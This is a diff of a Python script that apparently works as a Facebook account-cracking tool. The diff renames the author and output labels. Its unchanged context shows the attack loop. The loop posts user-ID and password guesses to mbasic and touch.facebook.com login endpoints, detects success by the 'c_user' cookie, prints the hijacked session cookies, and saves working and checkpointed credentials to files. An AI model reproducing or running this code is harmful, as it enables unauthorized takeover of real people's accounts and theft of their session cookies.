@@ -1,5 +1,5 @@
 # -*- coding: utf-8
-# author by RAKA Bangsat-XD
+# author by ☆RAKA☆ ™︻®╤───────═◍➤
 import os
 try:
 	import requests
@@ -55,9 +55,9 @@ def logo():
 	os.system("clear")
 	print("""\033[1;97m  L E G E N D -- R A K A .X. M A N D A. \033[1;0m
 \033[1;97m--------------------------------------------------
-\033[1;93m➤\033[1;97m Author   : RAKA BANGSAT-XD
+\033[1;93m➤\033[1;97m Author   : ☆ RAKA ☆ ™︻®╤───────═◍➤
 \033[1;93m➤\033[1;97m Github   : https://github.com/Bangsat-XD
-\033[1;93m➤\033[1;97m Whatsapp : 
+\033[1;93m➤\033[1;97m Twitter  : Bangsat_XD
 \033[1;97m--------------------------------------------------""")
 def login():
 	os.system("clear")
@@ -353,13 +353,13 @@ def mbasic(user):
 			gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print("\r\033[0;92m[FUEGO-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
+				print("\r\033[0;92m[RAKA-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[0;91m[FUEGO-CP] %s|%s\033[0;96m        "%(uid, pw))
+				print("\r\033[0;91m[RAKA-CP] %s|%s\033[0;96m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -405,13 +405,13 @@ def mobile(user):
 			gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print("\r\033[0;92m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+				print("\r\033[0;92m[RAKA-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[0;91m[FUEGO-CP] %s|%s\033[0;91m        "%(uid, pw))
+				print("\r\033[0;91m[RAKA-CP] %s|%s\033[0;91m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -457,13 +457,13 @@ def manual():
 				gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 				if "c_user" in ses.cookies.get_dict().keys():
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r\033[0;92m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+					print("\r\033[0;92m[RAKA-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
 					ok.append("%s|%s"%(uid, pw))
 					open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 					break
 					continue
 				elif "checkpoint" in ses.cookies.get_dict().keys():
-					print("\r\033[0;91m[FUEGO-CP] %s|%s\033[0;91m        "%(uid, pw))
+					print("\r\033[0;91m[RAKA-CP] %s|%s\033[0;91m        "%(uid, pw))
 					cp.append("%s|%s"%(uid, pw))
 					open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 					break
